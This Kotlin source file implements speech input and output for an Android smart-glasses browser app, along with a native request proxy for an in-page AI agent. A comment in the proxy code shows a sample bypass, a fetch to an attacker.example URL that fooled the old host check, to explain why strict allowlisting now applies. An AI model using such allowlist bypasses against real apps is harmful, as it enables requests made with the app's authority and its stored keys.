package com.smartview.app

import android.content.Context
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit
import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

/**
 * Groq-powered speech stack. The glasses ship NO on-device TTS engine or speech
 * recognizer (verified: zero speech packages installed), so — exactly like the
 * referenced TAPLINKX3 v1.7.0 mic key — STT runs through Groq Whisper, and spoken
 * output through Groq PlayAI TTS. One user-supplied API key powers STT, TTS and
 * the page-agent LLM.
 */
object GroqSpeech {
    private const val TAG = "SmartView"
    private const val BASE = "https://api.groq.com/openai/v1"
    const val STT_MODEL = "whisper-large-v3-turbo"
    // Groq's current TTS (playai-tts was decommissioned). Orpheus needs a one-time
    // terms acceptance by the org admin in the Groq console.
    const val TTS_MODEL = "canopylabs/orpheus-v1-english"
    // Groq's Orpheus voices: [autumn diana hannah austin daniel troy]. "tara" (the
    // open-source Orpheus default) is NOT accepted here and 400s ("voice must be selected").
    const val TTS_VOICE = "autumn"

    /** Surfaces a one-line TTS/STT failure reason to the UI (e.g. terms-acceptance). */
    var onSpeechError: ((String) -> Unit)? = null

    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private val main = Handler(Looper.getMainLooper())

    private fun prefs(context: Context) =
        context.getSharedPreferences("smartview", Context.MODE_PRIVATE)

    /** Groq key — always powers STT + TTS (and page-agent when Groq is the agent). */
    fun apiKey(context: Context): String = prefs(context).getString("groq_api_key", "").orEmpty()

    fun setApiKey(context: Context, key: String) {
        prefs(context).edit().putString("groq_api_key", key.trim()).apply()
    }

    // ------------------------------------------------------------------
    //  page-agent LLM provider (switchable). Groq's free tier caps at
    //  8k TPM — far too little for page-agent's ~6k-token multi-step
    //  requests — so the agent LLM is configurable, defaulting to Gemini
    //  (free tier: 1M TPM). STT/TTS always stay on Groq.
    // ------------------------------------------------------------------
    data class AgentProvider(
        val id: String, val label: String, val baseUrl: String,
        val model: String, val keyPref: String, val keyHint: String
    )

    val AGENT_PROVIDERS = listOf(
        // gemini-flash-lite-latest: only free Gemini model that's both reliably
        // available (full/preview Flash 503 "high demand"; 2.0-flash 429s) and does
        // tool calling. "latest" alias tracks Google's current Flash-Lite.
        AgentProvider("gemini", "Gemini Flash-Lite", "https://generativelanguage.googleapis.com/v1beta/openai",
            "gemini-flash-lite-latest", "gemini_api_key", "AIza…"),
        AgentProvider("cerebras", "Cerebras Llama-3.3 70B", "https://api.cerebras.ai/v1",
            "llama-3.3-70b", "cerebras_api_key", "csk-…"),
        AgentProvider("groq", "Groq gpt-oss-120b", "https://api.groq.com/openai/v1",
            "openai/gpt-oss-120b", "groq_api_key", "gsk_…"),
    )

    fun agentProvider(context: Context): AgentProvider {
        val id = prefs(context).getString("agent_provider", "gemini")
        return AGENT_PROVIDERS.firstOrNull { it.id == id } ?: AGENT_PROVIDERS.first()
    }

    fun agentKey(context: Context): String =
        prefs(context).getString(agentProvider(context).keyPref, "").orEmpty()

    fun setAgentProvider(context: Context, id: String) {
        if (AGENT_PROVIDERS.any { it.id == id }) prefs(context).edit().putString("agent_provider", id).apply()
    }

    fun setProviderKey(context: Context, keyPref: String, value: String) {
        prefs(context).edit().putString(keyPref, value.trim()).apply()
    }

    /** Hosts whose fetches page-agent makes cross-origin — must bypass page CSP. */
    val AGENT_HOSTS = listOf("api.groq.com", "generativelanguage.googleapis.com", "api.cerebras.ai")

    // ------------------------------------------------------------------
    //  Recorder (TAPLINKX3 pattern: MediaRecorder → AAC/M4A)
    // ------------------------------------------------------------------

    class Recorder(private val context: Context) {
        private var recorder: MediaRecorder? = null
        private var file: File? = null
        @Volatile var isRecording = false
            private set

        fun start(): Boolean {
            stopInternal()
            return runCatching {
                val f = File.createTempFile("rec_", ".m4a", context.cacheDir)
                @Suppress("DEPRECATION")
                val r = MediaRecorder()
                r.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
                r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                r.setAudioSamplingRate(44100)
                r.setAudioEncodingBitRate(128000)
                r.setOutputFile(f.absolutePath)
                r.prepare()
                r.start()
                recorder = r
                file = f
                isRecording = true
                true
            }.onFailure {
                Log.w(TAG, "recorder start failed: ${it.message}")
                stopInternal()
            }.getOrDefault(false)
        }

        /** Stop and return the recorded file (null if nothing usable). */
        fun stop(): File? {
            val f = file
            stopInternal()
            return f?.takeIf { it.exists() && it.length() > 1200 } // ignore blips
        }

        private fun stopInternal() {
            runCatching { recorder?.stop() }
            runCatching { recorder?.release() }
            recorder = null
            isRecording = false
        }
    }

    // ------------------------------------------------------------------
    //  STT: Groq Whisper (multipart, per TAPLINKX3 GroqAudioService)
    // ------------------------------------------------------------------

    /** onResult(text, error): text non-null on success; error names the real failure. */
    fun transcribe(context: Context, audio: File, onResult: (text: String?, error: String?) -> Unit) {
        val key = apiKey(context)
        if (key.isEmpty()) { main.post { onResult(null, "Set your Groq API key in Settings") }; return }
        Thread {
            var errMsg: String? = null
            val text = runCatching {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("file", audio.name, audio.asRequestBody("audio/m4a".toMediaType()))
                    .addFormDataPart("model", STT_MODEL)
                    .addFormDataPart("response_format", "json")
                    // Bias decoding toward the command vocabulary. Whisper is
                    // tuned for prose, so a short clipped command lands on
                    // whatever ordinary English is nearest: "bookmark this
                    // page" came back as "bunk up this page" and fell through
                    // to the agent. Priming the decoder fixes that where it
                    // actually breaks, instead of guessing downstream — a
                    // fuzzy matcher loose enough to rescue that transcript is
                    // also loose enough to swallow "summarise this page".
                    //
                    // This is a HINT, not a grammar: dictation of arbitrary
                    // text and URLs still transcribes normally.
                    .addFormDataPart(
                        "prompt",
                        "Voice commands for a web browser: bookmark this page, " +
                        "open bookmarks, delete bookmark, refresh, reload, go back, " +
                        "go forward, go home, scroll down, scroll up, top, bottom, " +
                        "stop, help. Also website names and questions about the page."
                    )
                    // Commands are short; sampling adds nothing but variance.
                    .addFormDataPart("temperature", "0")
                    .build()
                val req = Request.Builder()
                    .url("$BASE/audio/transcriptions")
                    .header("Authorization", "Bearer $key")
                    .post(body)
                    .build()
                http.newCall(req).execute().use { resp ->
                    val raw = resp.body?.string().orEmpty()
                    Log.d(TAG, "STT HTTP ${resp.code} (${audio.length()}b in): ${raw.take(160)}")
                    if (!resp.isSuccessful) {
                        errMsg = when (resp.code) {
                            401, 403 -> "Invalid Groq API key"
                            429 -> "Groq rate limit — wait a moment"
                            else -> "Speech service error (HTTP ${resp.code})"
                        }
                        throw IOException("HTTP ${resp.code}")
                    }
                    JSONObject(raw).optString("text", "").trim()
                }
            }.onFailure { e ->
                Log.w(TAG, "transcribe failed: ${e.message}")
                if (errMsg == null) {
                    val m = e.message.orEmpty()
                    errMsg = if (e is java.net.UnknownHostException || e is java.net.SocketTimeoutException ||
                        m.contains("Unable to resolve host") || m.contains("Network is unreachable") ||
                        m.contains("timeout", true) || m.contains("Failed to connect", true))
                        "📵 No internet connection" else "Speech error — try again"
                }
            }.getOrNull()
            runCatching { audio.delete() }
            val finalText = text?.takeIf { it.isNotEmpty() }
            main.post { onResult(finalText, if (finalText == null) errMsg else null) }
        }.start()
    }

    // ------------------------------------------------------------------
    //  TTS: Groq PlayAI → WAV file → MediaPlayer
    // ------------------------------------------------------------------

    private var player: MediaPlayer? = null

    /** Continuation + temp file owned by the CURRENT playback, so a cancel can settle them. */

    private var pendingDone: (() -> Unit)? = null

    private var pendingWav: File? = null

    /** Speak [text]; [onDone] fires on the main thread when playback ends/fails. */
    /**
     * Upper bound on a single spoken utterance.
     *
     * This is a RESOURCE guard, not a style choice: it bounds one TTS request,
     * nothing more. Long answers are wanted — a thorough reply that runs a
     * minute is a feature, and any single tap stops playback (see
     * interceptTap), so the wearer is never trapped listening.
     */
    private const val SPEAK_MAX = 4000

    /** Clip only if we hit the ceiling, and end on a sentence, not mid-word. */
    private fun clipForSpeech(text: String): String {
        val t = text.trim()
        if (t.length <= SPEAK_MAX) return t
        val head = t.take(SPEAK_MAX)
        val cut = maxOf(head.lastIndexOf(". "), head.lastIndexOf("! "), head.lastIndexOf("? "))
        return if (cut > SPEAK_MAX / 3) head.substring(0, cut + 1) else head.trimEnd() + "…"
    }

    /**
     * Notified when an answer could not be SPOKEN, so the UI can show it instead.
     *
     * Losing the voice is not the same as losing the answer, but the code used
     * to treat it that way: a failed TTS call was logged and the text dropped,
     * leaving the user with silence. On glasses that is the most confusing
     * possible outcome — silence is exactly what "it never heard me" looks
     * like, so the user re-asks and burns the quota further.
     *
     * Hit for real during testing: Groq's free tier caps TTS at 3600 tokens per
     * DAY, and once that trips every reply goes mute for hours.
     *
     * (text = what should have been said, reason = human-readable cause)
     */
    @Volatile var onSpeechFailure: ((text: String, reason: String) -> Unit)? = null

    /**
     * When Groq TTS will accept work again.
     *
     * The free tier's cap is a DAILY token budget, so once it trips it stays
     * tripped for hours. Rediscovering that on every single utterance costs a
     * pointless round trip before each reply and makes the app feel broken
     * rather than degraded. Groq tells us how long to wait — believe it, and
     * go straight to the fallback until then.
     */
    @Volatile private var groqTtsBlockedUntil = 0L

    /**
     * The cooldown has to survive a restart.
     *
     * The cap is a DAILY budget but the flag was in memory only, so every
     * relaunch retried a provider already known to be out — one wasted round
     * trip per session, and a quota warning that can surface on screen. Keep it
     * in prefs and the app simply stays on the working provider.
     */
    private fun blockedUntil(context: Context): Long {
        if (groqTtsBlockedUntil == 0L) {
            groqTtsBlockedUntil = prefs(context).getLong("groq_tts_blocked_until", 0L)
        }
        return groqTtsBlockedUntil
    }

    private fun blockGroqTts(context: Context, ms: Long) {
        groqTtsBlockedUntil = System.currentTimeMillis() + ms
        prefs(context).edit().putLong("groq_tts_blocked_until", groqTtsBlockedUntil).apply()
    }

    /** Parse Groq's "try again in 25m59.99s" into millis; 0 if not present. */
    private fun retryAfterMs(raw: String?): Long {
        val m = Regex("try again in ([0-9hms.]+)").find(raw.orEmpty())?.groupValues?.get(1) ?: return 0L
        var ms = 0L
        Regex("([0-9.]+)([hms])").findAll(m).forEach { g ->
            val v = g.groupValues[1].toDoubleOrNull() ?: 0.0
            ms += when (g.groupValues[2]) {
                "h" -> (v * 3_600_000).toLong()
                "m" -> (v * 60_000).toLong()
                else -> (v * 1000).toLong()
            }
        }
        return ms
    }

    /** Turn a provider error into something worth putting in front of a user. */
    private fun speechFailureReason(raw: String?): String {
        val m = raw.orEmpty()
        return when {
            m.contains("Rate limit", true) || m.contains("rate_limit", true) -> {
                // Groq reports this as a float, so the raw string arrives as
                // "25m59.999999999s". Drop the fractional part — nobody needs
                // nanosecond precision on a "come back later".
                val again = Regex("try again in ([0-9hms .]+)").find(m)?.groupValues?.get(1)
                    ?.replace(Regex("\\.\\d+"), "")?.trim()?.trimEnd('.')
                if (again != null) "Voice quota reached — retry in $again. Answer shown below."
                else "Voice quota reached for today. Answer shown below."
            }
            m.contains("401") || m.contains("invalid_api_key", true) ->
                "Voice unavailable: check your Groq key. Answer shown below."
            else -> "Voice unavailable. Answer shown below."
        }
    }

    // ------------------------------------------------------------------
    //  Gemini TTS — second source of voice
    // ------------------------------------------------------------------

    private const val GEMINI_TTS_MODEL = "gemini-2.5-flash-preview-tts"
    private const val GEMINI_TTS_VOICE = "Kore"
    private const val GEMINI_TTS_RATE = 24_000

    /**
     * Wrap raw PCM in a WAV header.
     *
     * Gemini hands back headerless signed 16-bit little-endian mono PCM
     * ("audio/L16;codec=pcm;rate=24000"). MediaPlayer will not touch that
     * without a container, so build the 44-byte canonical header ourselves.
     */
    private fun pcmToWav(pcm: ByteArray, sampleRate: Int): ByteArray {
        val channels = 1; val bits = 16
        val byteRate = sampleRate * channels * bits / 8
        val out = java.io.ByteArrayOutputStream(44 + pcm.size)
        fun s(v: String) = out.write(v.toByteArray(Charsets.US_ASCII))
        fun i32(v: Int) = out.write(byteArrayOf(
            (v and 0xff).toByte(), ((v shr 8) and 0xff).toByte(),
            ((v shr 16) and 0xff).toByte(), ((v shr 24) and 0xff).toByte()))
        fun i16(v: Int) = out.write(byteArrayOf((v and 0xff).toByte(), ((v shr 8) and 0xff).toByte()))
        s("RIFF"); i32(36 + pcm.size); s("WAVE")
        s("fmt "); i32(16); i16(1); i16(channels)
        i32(sampleRate); i32(byteRate); i16(channels * bits / 8); i16(bits)
        s("data"); i32(pcm.size)
        out.write(pcm)
        return out.toByteArray()
    }

    /**
     * Speak via Gemini instead of Groq.
     *
     * Worth having because Groq's free tier caps TTS at 3600 tokens per DAY —
     * small enough that ordinary use hits it and the app goes mute for hours.
     * The Gemini key is already present for the agent, so this costs the user
     * no extra setup and fails over to a provider with a separate quota.
     *
     * NOTE this is Google's NATIVE endpoint, so the key goes in x-goog-api-key.
     * The agent path talks to the /v1beta/openai compatibility endpoint, which
     * instead wants a Bearer token — sending the wrong one is a 400, and the
     * two live a few lines apart, so keep them straight.
     */
    private fun geminiTts(context: Context, text: String): ByteArray? {
        val key = prefs(context).getString("gemini_api_key", "").orEmpty()
        if (key.isEmpty()) return null
        val payload = JSONObject()
            .put("contents", org.json.JSONArray().put(
                JSONObject().put("parts", org.json.JSONArray().put(JSONObject().put("text", text)))))
            .put("generationConfig", JSONObject()
                .put("responseModalities", org.json.JSONArray().put("AUDIO"))
                .put("speechConfig", JSONObject().put("voiceConfig", JSONObject()
                    .put("prebuiltVoiceConfig", JSONObject().put("voiceName", GEMINI_TTS_VOICE)))))
        val req = Request.Builder()
            .url("https://generativelanguage.googleapis.com/v1beta/models/$GEMINI_TTS_MODEL:generateContent")
            .header("x-goog-api-key", key)
            .post(payload.toString().toRequestBody("application/json".toMediaType()))
            .build()
        return runCatching {
            http.newCall(req).execute().use { resp ->
                val body = resp.body?.string().orEmpty()
                if (!resp.isSuccessful) {
                    Log.w(TAG, "gemini tts HTTP ${resp.code}: ${body.take(160)}")
                    return@use null
                }
                val b64 = JSONObject(body)
                    .getJSONArray("candidates").getJSONObject(0)
                    .getJSONObject("content").getJSONArray("parts").getJSONObject(0)
                    .getJSONObject("inlineData").getString("data")
                val pcm = android.util.Base64.decode(b64, android.util.Base64.DEFAULT)
                Log.d(TAG, "gemini tts ${pcm.size} pcm bytes")
                pcmToWav(pcm, GEMINI_TTS_RATE)
            }
        }.onFailure { Log.w(TAG, "gemini tts failed: ${it.message}") }.getOrNull()
    }

    /**
     * Bumped by [stopSpeaking]. A speak() call captures it at entry and checks
     * it again before playing, so a cancel that lands WHILE the audio is still
     * being synthesised is honoured instead of being silently outrun.
     *
     * Without this, "stop talking" only worked if talking had already started.
     * Measured: media detected at 22:55:36.6 and stopSpeaking() called, but the
     * Groq round trip did not finish until 22:55:38.9 — so there was nothing to
     * stop at the time, and five seconds of summary then played over the video.
     */
    @Volatile private var speakGen = 0

    fun speak(context: Context, text: String, onDone: () -> Unit) {
        val key = apiKey(context)
        val clipped = clipForSpeech(text)
        if (key.isEmpty() || clipped.isEmpty()) { main.post(onDone); return }
        val myGen = ++speakGen
        Thread {
            var failure: String? = null
            // Known-exhausted: don't spend a round trip proving it again.
            val skipGroq = System.currentTimeMillis() < blockedUntil(context)
            var wav = if (skipGroq) null else runCatching {
                val payload = JSONObject()
                    .put("model", TTS_MODEL)
                    .put("voice", TTS_VOICE)
                    .put("input", clipped)
                    .put("response_format", "wav")
                val req = Request.Builder()
                    .url("$BASE/audio/speech")
                    .header("Authorization", "Bearer $key")
                    .post(payload.toString().toRequestBody("application/json".toMediaType()))
                    .build()
                http.newCall(req).execute().use { resp ->
                    if (!resp.isSuccessful) {
                        val body = resp.body?.string().orEmpty()
                        val msg = runCatching {
                            JSONObject(body).getJSONObject("error").getString("message")
                        }.getOrDefault("HTTP ${resp.code}")
                        val friendly = if (msg.contains("terms", true))
                            "Accept the Orpheus TTS terms in your Groq console to enable spoken output."
                        else "TTS error: ${msg.take(120)}"
                        main.post { onSpeechError?.invoke(friendly) }
                        throw IOException(msg)
                    }
                    // Groq streams WAV with placeholder 0xFFFFFFFF RIFF/data sizes,
                    // which MediaPlayer.prepare() rejects (status=0x64). Patch the
                    // header with the real byte counts before writing to disk.
                    val raw = resp.body?.bytes() ?: ByteArray(0)
                    val fixed = fixWavSizes(raw)
                    val f = File.createTempFile("tts_", ".wav", context.cacheDir)
                    f.outputStream().use { out -> out.write(fixed) }
                    Log.d(TAG, "tts wav ${f.length()} bytes (voice=$TTS_VOICE)")
                    f
                }
            }.onFailure {
                Log.w(TAG, "tts failed: ${it.message}")
                failure = speechFailureReason(it.message)
                retryAfterMs(it.message).takeIf { ms -> ms > 0 }?.let { ms ->
                    blockGroqTts(context, ms)
                    Log.d(TAG, "groq tts blocked for ${ms / 1000}s; using fallback")
                }
            }.getOrNull()

            // Skipping Groq must still leave a reason behind: if the fallback
            // also fails, the answer has to reach the screen rather than vanish.
            if (skipGroq) failure = speechFailureReason("Rate limit reached")

            // Groq is out — try Gemini before giving up on speaking at all.
            // Different provider, separate quota, key already configured.
            if (wav == null) {
                geminiTts(context, clipped)?.let { bytes ->
                    val f = File.createTempFile("tts_", ".wav", context.cacheDir)
                    f.outputStream().use { o -> o.write(bytes) }
                    Log.d(TAG, "tts via gemini fallback (${f.length()} bytes)")
                    wav = f
                    failure = null   // spoken after all; nothing to show on screen
                }
            }
            main.post {
                // Cancelled while we were synthesising — most often because
                // media started playing and the whole point is to not talk over
                // it. Drop the audio on the floor, but still run onDone so no
                // caller is left waiting on a callback that never arrives.
                if (myGen != speakGen) {
                    runCatching { wav?.delete() }
                    Log.d(TAG, "tts discarded: cancelled before playback")
                    onDone(); return@post
                }
                if (wav == null) {
                    // Hand the text to the UI before completing: the answer is
                    // still good, only the voice is missing.
                    failure?.let { r -> onSpeechFailure?.invoke(text, r) }
                    onDone(); return@post
                }
                stopSpeaking()
                val mp = MediaPlayer()
                player = mp
                pendingDone = onDone
                pendingWav = wav
                runCatching {
                    mp.setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_MEDIA)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                            .build()
                    )
                    mp.setDataSource(wav.absolutePath)
                    mp.setOnCompletionListener {
                        Log.d(TAG, "tts playback complete")
                        runCatching { mp.release() }
                        if (player === mp) { player = null; pendingDone = null; pendingWav = null }
                        runCatching { wav.delete() }
                        onDone()
                    }
                    mp.setOnErrorListener { _, what, extra ->
                        Log.w(TAG, "tts MediaPlayer error what=$what extra=$extra")
                        runCatching { mp.release() }
                        if (player === mp) { player = null; pendingDone = null; pendingWav = null }
                        runCatching { wav.delete() }
                        onDone(); true
                    }
                    mp.prepare()
                    mp.setVolume(1f, 1f)
                    mp.start()
                    Log.d(TAG, "tts playback started dur=${mp.duration}ms")
                }.onFailure {
                    Log.w(TAG, "tts play setup failed: ${it.message}")
                    runCatching { mp.release() }
                    if (player === mp) { player = null; pendingDone = null; pendingWav = null }
                    runCatching { wav.delete() }
                    onDone()
                }
            }
        }.start()
    }

    // ------------------------------------------------------------------
    //  Native pass-through for the page-agent fetch proxy.
    //  page-agent runs inside the loaded page's JS context, so its fetch to
    //  api.groq.com is blocked by that page's Content-Security-Policy
    //  (e.g. DuckDuckGo's connect-src). Routing the call through native OkHttp
    //  makes the request as the app (no page CSP) and hands the bytes back to JS.
    // ------------------------------------------------------------------
    /**
     * Attach the stored provider credential natively, keyed by host, so the
     * page never holds it. Gemini wants x-goog-api-key; the OpenAI-compatible
     * endpoints want a bearer token.
     */
    private fun attachAgentCredential(builder: Request.Builder, host: String?, context: Context) {
        val k = agentKey(context)
        if (k.isBlank() || host == null) return
        // Bearer for ALL THREE. Every provider here is addressed through its
        // OpenAI-compatible endpoint — note Gemini's baseUrl ends /v1beta/openai
        // — so they all want a bearer token. Sending x-goog-api-key (correct for
        // Google's NATIVE Gemini API, wrong for its compat layer) produced
        // "Missing or invalid Authorization header." on every agent request.
        builder.header("Authorization", "Bearer " + k)
    }

    fun rawRequest(
        context: Context,
        url: String, method: String, headersJson: String, body: String,
        onResult: (code: Int, ok: Boolean, bytes: ByteArray) -> Unit
    ) {
        Thread {
            try {
                // THE trust boundary. The JS side also checks, but that check
                // runs in the page's world where any script can redefine it, so
                // this native one is the real control. Previously the JS did
                // `url.indexOf(host) >= 0` against the WHOLE url including the
                // query, so fetch('https://attacker.example/c?x=api.groq.com')
                // was performed by OkHttp as the app — no CORS preflight, no
                // page CSP, response handed back readable.
                val parsed = runCatching { url.toHttpUrlOrNull() }.getOrNull()
                val host = parsed?.host?.lowercase()
                val allowed = parsed != null &&
                    parsed.isHttps &&
                    host != null &&
                    AGENT_HOSTS.any { host == it || host.endsWith(".$it") }
                if (!allowed) {
                    Log.w(TAG, "rawRequest REFUSED non-allowlisted url host=$host")
                    onResult(0, false, "blocked: host not allowed".toByteArray())
                    return@Thread
                }

                val builder = Request.Builder().url(url)
                var contentType = "application/json"
                runCatching {
                    val headers = JSONObject(headersJson)
                    val keys = headers.keys()
                    while (keys.hasNext()) {
                        val k = keys.next()
                        val v = headers.optString(k)
                        if (k.equals("content-type", true)) contentType = v.ifBlank { contentType }
                        // Never let the page choose the credential headers: it
                        // supplies the 'sv-proxy' placeholder, and the real key
                        // is attached below from native storage.
                        if (k.equals("authorization", true) || k.equals("x-goog-api-key", true)) continue
                        runCatching { builder.header(k, v) }
                    }
                }
                attachAgentCredential(builder, host, context)
                val m = method.uppercase()
                if (m == "POST" || m == "PUT" || m == "PATCH" || m == "DELETE") {
                    builder.method(m, body.toRequestBody(contentType.toMediaType()))
                } else {
                    builder.method(m, null)
                }
                val req = builder.build()
                // Free Gemini models transiently return 503 "high demand"; retry a
                // few times with backoff so page-agent's step doesn't just fail.
                var attempt = 0
                while (true) {
                    val (code, ok, bytes) = http.newCall(req).execute().use { resp ->
                        Triple(resp.code, resp.isSuccessful, resp.body?.bytes() ?: ByteArray(0))
                    }
                    if (code == 503 && attempt < 3) {
                        attempt++
                        Log.d(TAG, "rawRequest 503, retry $attempt")
                        Thread.sleep(700L * attempt)
                        continue
                    }
                    onResult(code, ok, bytes)
                    break
                }
            } catch (e: Exception) {
                Log.w(TAG, "rawRequest failed: ${e.message}")
                onResult(0, false, (e.message ?: "network error").toByteArray())
            }
        }.start()
    }

    /**
     * Rewrite a streamed RIFF/WAVE header so RIFF-chunk-size and data-chunk-size
     * hold real byte counts. Groq's TTS ships both as 0xFFFFFFFF (streaming
     * placeholders), which Android MediaPlayer refuses to prepare. Returns the
     * input unchanged if it isn't the expected RIFF/WAVE layout.
     */
    private fun fixWavSizes(b: ByteArray): ByteArray {
        if (b.size < 44) return b
        fun tag(off: Int) = String(b, off, 4, Charsets.US_ASCII)
        if (tag(0) != "RIFF" || tag(8) != "WAVE") return b
        fun putLE(off: Int, v: Int) {
            b[off] = (v and 0xFF).toByte()
            b[off + 1] = ((v ushr 8) and 0xFF).toByte()
            b[off + 2] = ((v ushr 16) and 0xFF).toByte()
            b[off + 3] = ((v ushr 24) and 0xFF).toByte()
        }
        fun getLE(off: Int): Long =
            (b[off].toLong() and 0xFF) or ((b[off + 1].toLong() and 0xFF) shl 8) or
                ((b[off + 2].toLong() and 0xFF) shl 16) or ((b[off + 3].toLong() and 0xFF) shl 24)
        // RIFF size = total - 8.
        putLE(4, b.size - 8)
        // Walk chunks to find "data"; fall back to a byte scan if a size looks bogus.
        var i = 12
        var dataOff = -1
        while (i + 8 <= b.size) {
            if (tag(i) == "data") { dataOff = i; break }
            val sz = getLE(i + 4)
            if (sz <= 0 || i + 8 + sz > b.size) break   // bogus/placeholder — stop walking
            i += (8 + sz + (sz and 1)).toInt()
        }
        if (dataOff < 0) {
            val needle = byteArrayOf('d'.code.toByte(), 'a'.code.toByte(), 't'.code.toByte(), 'a'.code.toByte())
            var p = 12
            while (p + 4 <= b.size) {
                if (b[p] == needle[0] && b[p + 1] == needle[1] &&
                    b[p + 2] == needle[2] && b[p + 3] == needle[3]) { dataOff = p; break }
                p++
            }
        }
        if (dataOff in 0..(b.size - 8)) putLE(dataOff + 4, b.size - (dataOff + 8))
        return b
    }

    val isSpeaking: Boolean get() = player?.isPlaying == true

    /**
     * Stop playback.
     *
     * MediaPlayer.stop()/release() do NOT fire OnCompletionListener, so the
     * continuation handed to speak() is simply lost — and the app advertises
     * "tap to stop", which routes here. That stranded the two callbacks the
     * agent loop depends on: scheduleAgentHide() after an answer, and
     * startVoice(AGENT_ANSWER) after an ask_user question.
     *
     * @param deliver run the pending continuation. TRUE only for a deliberate
     *   USER cancel. Everything else — dim, settings, teardown, or being
     *   pre-empted by the next utterance — must leave it false: those paths
     *   are replacing or tearing down the very interaction the continuation
     *   belonged to, and running it there would open the mic in dim mode, on
     *   the settings page, or after onDestroy.
     */
    fun stopSpeaking(deliver: Boolean = false) {
        // Invalidate anything still being synthesised as well as anything
        // already sounding. Stopping only the player left a request in flight
        // that would arrive moments later and start talking regardless.
        speakGen++
        val mp = player; player = null
        val done = pendingDone; pendingDone = null
        val wav = pendingWav; pendingWav = null
        runCatching { mp?.stop() }
        runCatching { mp?.release() }
        runCatching { wav?.delete() }
        if (deliver) done?.let { main.post(it) }
    }
}
